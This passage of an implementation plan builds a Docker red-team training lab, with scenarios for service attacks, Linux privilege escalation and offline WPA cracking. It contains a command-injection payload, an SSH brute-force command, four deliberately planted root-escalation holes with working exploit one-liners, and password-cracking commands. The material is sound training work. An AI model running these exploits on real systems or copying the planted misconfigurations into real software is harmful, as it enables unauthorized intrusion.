ssh svc@172.28.0.32           # password from hydra
# ... then the same, with Metasploit (compare the workflow):
msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_login; set RHOSTS 172.28.0.32; \
  set USERNAME svc; set PASS_FILE /usr/share/wordlists/rockyou.txt; run; sessions -l; exit'
# Web command injection
curl 'http://172.28.0.33/cmd.php?host=127.0.0.1;cat /flag.txt'
```
Explain: anonymous/null auth misconfig, password guessing vs. an authenticated session object in msf, and shell metacharacters breaking out of `system()`.

- [ ] **Step 6: Commit**

```bash
git add scenarios/03-services
git commit -m "feat: add 03-services scenario with four targets, verify, and guides"
```

---

### Task 6: Scenario 04 — Linux privilege escalation

**Files:**
- Create: `scenarios/04-privesc/target/Dockerfile`
- Create: `scenarios/04-privesc/target/entrypoint.sh`
- Create: `scenarios/04-privesc/docker-compose.yml`
- Create: `scenarios/04-privesc/verify.sh`
- Create: `scenarios/04-privesc/README.md`, `scenarios/04-privesc/SOLUTION.md`

**Interfaces:**
- Consumes: attacker box + `lab`. The student reaches the target over SSH as `lowpriv:lowpriv` at `172.28.0.40` (creds intentionally known — this scenario is about *escalation*, not initial access).
- Produces: a target that, based on `PRIVESC_PATH` (default `suid`), seeds exactly one escalation path to root, with `/root/flag.txt` = `PRIVESC-FLAG{...}`. Supported values: `suid`, `sudo`, `cron`, `cap`. Reset re-rolls by cycling the value.

- [ ] **Step 1: Write the failing test**

Create `scenarios/04-privesc/verify.sh`:

```bash
#!/usr/bin/env bash
set -euo pipefail
A() { docker exec redteam-lab-attacker bash -lc "$1"; }
fail() { echo "FAIL: $1"; exit 1; }
SSH="sshpass -p lowpriv ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null lowpriv@172.28.0.40"

docker exec redteam-lab-attacker bash -lc "command -v sshpass" >/dev/null \
  || fail "sshpass missing on attacker (it is in Task 2's Dockerfile — rebuild)"

# The default path is SUID bash: exploit and read root flag.
A "$SSH 'ls -l /usr/local/bin/backup && /usr/local/bin/backup -p -c \"cat /root/flag.txt\"'" \
  | grep -q "PRIVESC-FLAG" || fail "suid privesc did not yield root flag"

echo "PASS: 04-privesc"
```

Note: this asserts the default `suid` path. `sshpass` is installed on the attacker box in Task 2; the `verify --all` runner depends on it.

- [ ] **Step 2: Run test to verify it fails**

Run: `./lab up 04-privesc` (fails) → `./lab verify 04-privesc`
Expected: FAIL — target absent.

- [ ] **Step 3: Write the target and compose**

Create `scenarios/04-privesc/target/entrypoint.sh`:

```bash
#!/usr/bin/env bash
set -e
PATH_MODE="${PRIVESC_PATH:-suid}"
echo "PRIVESC-FLAG{r00t_via_${PATH_MODE}}" > /root/flag.txt
chmod 600 /root/flag.txt

case "$PATH_MODE" in
  suid)  cp /bin/bash /usr/local/bin/backup && chmod 4755 /usr/local/bin/backup ;;
  sudo)  echo 'lowpriv ALL=(ALL) NOPASSWD: /usr/bin/find' > /etc/sudoers.d/lowpriv ;;
  cron)  echo '* * * * * root /usr/local/bin/task.sh' > /etc/cron.d/task \
         && echo -e '#!/bin/bash\ncat /root/flag.txt > /tmp/out.txt; chmod 666 /tmp/out.txt' > /usr/local/bin/task.sh \
         && chmod 777 /usr/local/bin/task.sh && service cron start ;;
  cap)   cp /usr/bin/python3 /usr/local/bin/pypriv \
         && setcap cap_setuid+ep /usr/local/bin/pypriv ;;
  *) echo "unknown PRIVESC_PATH: $PATH_MODE" >&2; exit 1 ;;
esac
mkdir -p /run/sshd
exec /usr/sbin/sshd -D -e
```

Create `scenarios/04-privesc/target/Dockerfile`:

```dockerfile
FROM debian:stable-slim
RUN apt-get update && apt-get install -y --no-install-recommends \
      openssh-server sudo cron python3 libcap2-bin procps \
    && rm -rf /var/lib/apt/lists/* \
    && useradd -m -s /bin/bash lowpriv && echo 'lowpriv:lowpriv' | chpasswd
COPY entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh
EXPOSE 22
ENTRYPOINT ["/entrypoint.sh"]
```

Create `scenarios/04-privesc/docker-compose.yml`:

```yaml
services:
  privesc:
    build: ./target
    container_name: redteam-lab-privesc
    cap_add: [SETUID, SETGID]       # allows the 'cap' path's setcap to function
    environment:
      PRIVESC_PATH: ${PRIVESC_PATH:-suid}
    networks: { redteam-lab-net: { ipv4_address: 172.28.0.40 } }

networks:
  redteam-lab-net:
    external: true
    name: redteam-lab-net
```

- [ ] **Step 4: Run the test to verify it passes**

Run: `./lab reset 04-privesc && sleep 8 && ./lab verify 04-privesc`
Expected: `PASS: 04-privesc`
Re-roll check: `PRIVESC_PATH=sudo ./lab reset 04-privesc` then from the attacker `sshpass -p lowpriv ssh ... lowpriv@172.28.0.40 'sudo find . -exec cat /root/flag.txt \; -quit'` returns the flag. Confirm the active path changed.

- [ ] **Step 5: Write README.md and SOLUTION.md**

`README.md` sections:
- **Objectives:** starting as `lowpriv`, escalate to root and read `/root/flag.txt`. Re-run with a different `PRIVESC_PATH` for a fresh puzzle.
- **Setup:** `./lab up 04-privesc`, then from `./lab shell`: `ssh lowpriv@172.28.0.40` (password `lowpriv`). To pick a path: `PRIVESC_PATH=sudo ./lab reset 04-privesc` (values: `suid`, `sudo`, `cron`, `cap`).
- **Hints:** three `<details>` — Hint 1: "enumerate first — run `/opt/privesc/linpeas.sh` (copy it over) or check SUID/sudo/caps/cron by hand"; Hint 2: name the enumeration commands (`find / -perm -4000 2>/dev/null`, `sudo -l`, `getcap -r / 2>/dev/null`, `cat /etc/cron.d/*`); Hint 3: give the exploitation one-liner per path from SOLUTION.
- **Checkpoint:** you read `/root/flag.txt` (starts with `PRIVESC-FLAG{`).

`SOLUTION.md` — annotated, one exploit per path:

```bash
# enumerate
find / -perm -4000 -type f 2>/dev/null ; sudo -l ; getcap -r / 2>/dev/null ; cat /etc/cron.d/* 2>/dev/null
# suid : a SUID copy of bash keeps euid=0 with -p
/usr/local/bin/backup -p -c 'cat /root/flag.txt'
# sudo : NOPASSWD find can run any command as root (GTFOBins)
sudo find . -exec cat /root/flag.txt \; -quit
# cron : the world-writable cron task runs as root — overwrite it
echo 'cat /root/flag.txt > /tmp/out.txt; chmod 666 /tmp/out.txt' > /usr/local/bin/task.sh ; sleep 65 ; cat /tmp/out.txt
# cap : cap_setuid on a python copy lets you setuid(0)
/usr/local/bin/pypriv -c 'import os; os.setuid(0); os.system("cat /root/flag.txt")'
```
Explain each mechanism (why `-p` preserves euid, GTFOBins, writable root-run script, file capabilities).

- [ ] **Step 6: Commit**

```bash
git add scenarios/04-privesc
git commit -m "feat: add 04-privesc scenario with re-rollable escalation paths"
```

---

### Task 7: Scenario 05 — Wireless (offline cracking)

**Files:**
- Create: `scenarios/05-wireless-offline/docker-compose.yml`
- Create: `scenarios/05-wireless-offline/data/fetch.sh`
- Create: `scenarios/05-wireless-offline/data/lab.lst`
- Create: `scenarios/05-wireless-offline/verify.sh`
- Create: `scenarios/05-wireless-offline/README.md`, `scenarios/05-wireless-offline/SOLUTION.md`

**Interfaces:**
- Consumes: attacker box (`aircrack-ng`, `hashcat`, `hcxpcapngtool`) and the `redteam-wifi` volume mounted at `/root/wifi` (declared in base, Task 2).
- Produces: a one-shot `wifi-gen` service that populates `redteam-wifi` with `wpa.cap` (aircrack-ng's canonical training capture — ESSID `Harkonen`, BSSID `00:14:6C:7E:40:80`, passphrase `biscotto`) and a `lab.lst` wordlist containing `biscotto`. Checkpoint: `aircrack-ng` recovers `biscotto`.

- [ ] **Step 1: Write the failing test**

Create `scenarios/05-wireless-offline/verify.sh`:

```bash
#!/usr/bin/env bash
set -euo pipefail
A() { docker exec redteam-lab-attacker bash -lc "$1"; }
fail() { echo "FAIL: $1"; exit 1; }

# Wait for the generator to drop files into the shared volume
for i in $(seq 1 20); do A "test -f /root/wifi/wpa.cap" && break; sleep 2; done
A "test -f /root/wifi/wpa.cap" || fail "wpa.cap not generated"

# aircrack-ng recovers the known passphrase 'biscotto'
A "aircrack-ng -w /root/wifi/lab.lst -b 00:14:6C:7E:40:80 /root/wifi/wpa.cap" \
  | grep -q "KEY FOUND! \[ biscotto \]" || fail "aircrack did not recover key"

echo "PASS: 05-wireless-offline"
```

- [ ] **Step 2: Run test to verify it fails**

Run: `./lab up 05-wireless-offline` (fails) → `./lab verify 05-wireless-offline`
Expected: FAIL — generator/data absent.

- [ ] **Step 3: Write the generator, wordlist, and compose**

Create `scenarios/05-wireless-offline/data/lab.lst`:

```
biscotto
password
12345678
hunter2
```

Create `scenarios/05-wireless-offline/data/fetch.sh`:

```bash
#!/usr/bin/env sh
set -e
# Canonical aircrack-ng training capture (known passphrase: biscotto).
# Pulled from the aircrack-ng test corpus; this is synthetic training data,
# not a real-world capture.
OUT=/out
cp /seed/lab.lst "$OUT/lab.lst"
if [ ! -f "$OUT/wpa.cap" ]; then
  wget -qO "$OUT/wpa.cap" \
    https://raw.githubusercontent.com/aircrack-ng/aircrack-ng/master/test/wpa.cap
fi
echo "wireless training data ready in $OUT"
```

Create `scenarios/05-wireless-offline/docker-compose.yml`:

```yaml
services:
  wifi-gen:
    image: alpine:3
    container_name: redteam-lab-wifi-gen
    command: ["sh", "/seed/fetch.sh"]
    volumes:
      - redteam-wifi:/out
      - ./data:/seed:ro
    networks: { redteam-lab-net: { ipv4_address: 172.28.0.50 } }

networks:
  redteam-lab-net:
    external: true
    name: redteam-lab-net
volumes:
  redteam-wifi:
    external: true
    name: redteam-lab_redteam-wifi
```

Note: the external volume name is the base project's volume (`<project>_<volume>` = `redteam-lab_redteam-wifi`). Confirm the exact name with `docker volume ls | grep redteam-wifi` after Task 2 and adjust if Compose named it differently.

- [ ] **Step 4: Run the test to verify it passes**

Run: `./lab reset 05-wireless-offline && sleep 8 && ./lab verify 05-wireless-offline`
Expected: `PASS: 05-wireless-offline`

- [ ] **Step 5: Write README.md and SOLUTION.md**

`README.md` sections:
- **Objectives:** (1) recover the WPA passphrase from `wpa.cap` with `aircrack-ng`; (2) do the same with `hashcat` (convert first); (3) understand where a real capture would come from (see `docs/wireless-hardware.md`).
- **Setup:** `./lab up 05-wireless-offline && ./lab shell`; files are in `/root/wifi/`.
- **Hints:** three `<details>` — Hint 1: "the capture holds a 4-way handshake; you crack it offline against a wordlist"; Hint 2: name `aircrack-ng -w`, and for hashcat, `hcxpcapngtool` then mode `22000`; Hint 3: give the exact commands from SOLUTION.
- **Reality note:** capturing a handshake needs a monitor-mode adapter and is out of scope here — see `docs/wireless-hardware.md`. This scenario is the offline cracking half only.
- **Checkpoint:** the tool prints the passphrase `biscotto`.

`SOLUTION.md` — annotated, exact commands:

```bash
# aircrack-ng route
aircrack-ng -w /root/wifi/lab.lst -b 00:14:6C:7E:40:80 /root/wifi/wpa.cap
# (or against the big list) aircrack-ng -w /usr/share/wordlists/rockyou.txt /root/wifi/wpa.cap
# hashcat route: convert cap -> 22000, then crack
hcxpcapngtool -o /root/wifi/wpa.22000 /root/wifi/wpa.cap
hashcat -m 22000 /root/wifi/wpa.22000 /root/wifi/lab.lst
hashcat -m 22000 /root/wifi/wpa.22000 --show
```
Explain: the handshake lets you test candidate passphrases offline (PBKDF2 + MIC check); mode 22000 is the modern WPA format; a mask attack (`-a 3`) targets known password patterns.

- [ ] **Step 6: Commit**

```bash
git add scenarios/05-wireless-offline
git commit -m "feat: add 05-wireless-offline scenario (aircrack-ng/hashcat) with guides"
```

---

### Task 8: Top-level docs and full-lab verification

**Files:**
- Create: `docs/getting-started.md`
- Create: `docs/wireless-hardware.md`
- Modify: `README.md` (add a scenario index + link to getting-started)

**Interfaces:**
- Consumes: all scenarios and the `lab verify --all` runner.
- Produces: onboarding docs and a green full-lab run.

- [ ] **Step 1: Write `docs/getting-started.md`**

Include, as prose + command blocks: prerequisites (Docker + Compose, confirmed present); the daily loop (`up` → `shell` → work → `reset`/`down`); how scenarios/hints/solutions are structured; the `verify` command; and a restated safety/authorization notice. Add a table listing the five scenarios, their target IPs, and their checkpoints (pull the IPs from Tasks 3–7).

- [ ] **Step 2: Write `docs/wireless-hardware.md`**

Document the live-RF half as a hardware-only reference, clearly marked **requires a monitor-mode-capable adapter and your own network / written authorization**. Cover, as reference commands (not run here): putting an adapter into monitor mode (`airmon-ng start wlan0`), capturing a handshake (`airodump-ng`), forcing a reauth (`aireplay-ng --deauth`), grabbing a PMKID (`hcxdumptool`), and converting captures for the offline workflow in scenario 05. State plainly that none of this runs in Docker and why (no RF hardware in containers).

- [ ] **Step 3: Add the scenario index to `README.md`**

Append a "## Scenarios" section listing `01-recon` … `05-wireless-offline` with a one-line description each and a link to `docs/getting-started.md`.

- [ ] **Step 4: Run the full-lab verification**

Run: `./lab verify --all`
Expected: each scenario prints its `PASS: <name>` line and the command exits `0`. Capture the output. If any scenario fails, fix that scenario's task before proceeding — do not mark this step done on a partial pass.

- [ ] **Step 5: Commit**

```bash
git add docs/getting-started.md docs/wireless-hardware.md README.md
git commit -m "docs: add getting-started, wireless-hardware guide, and scenario index"
```

---

## Self-Review

**1. Spec coverage:**
- Modular scenario range + `lab` script → Tasks 1, 2. ✓
- Five scenarios (recon/web/services/privesc/wireless-offline) → Tasks 3–7. ✓
- Guidance model (tiered hints + annotated SOLUTION + checkpoint) → every scenario task, Step 5, plus `verify.sh` as the checkpoint. ✓
- Private network, Kali attacker, dual host access (published 8080/3000) → Task 2 + Global Constraints + Task 4. ✓
- Reset/state (down -v + up, persistent `redteam-loot`, re-rollable privesc) → Task 2 (`reset`), Task 6 (`PRIVESC_PATH`). ✓
- Safety (scoped teardown by project, no privileged, loud README, self-generated wireless data) → Global Constraints, Task 1 README, Task 7. ✓
- Build/testing (incremental, per-scenario end-to-end solve, `verify`/`verify --all`) → `verify.sh` per scenario + Task 8 Step 4. ✓
- `docs/wireless-hardware.md` for the live-RF track → Task 8. ✓

**2. Placeholder scan:** No "TBD/TODO". Two implementer notes flag genuinely environment-dependent risks (DVWA scripted-login flakiness in Task 4; exact external volume name in Task 7) and give concrete fallbacks — these are decisions, not blanks.

**3. Type/name consistency:** `redteam-lab-attacker` (container), `redteam-lab-net` (network, `172.28.0.5` attacker), volumes `redteam-loot`/`redteam-wifi`, project `redteam-lab`, and the target IP map (`.10-.13`, `.20-.21`, `.30-.33`, `.40`, `.50`) are used identically across the `lab` script, base compose, and every scenario. `verify.sh` in each scenario matches the flags seeded by that scenario's targets (`RECON-FLAG`, `WEB-FLAG`, `FTP-FLAG`, `SMB-FLAG`, `PRIVESC-FLAG`, `biscotto`).

**Resolved during self-review:** Task 6's `verify.sh` and the `verify --all` runner use `sshpass`; it is now included in Task 2's attacker Dockerfile so the dependency is satisfied before Task 6 runs.
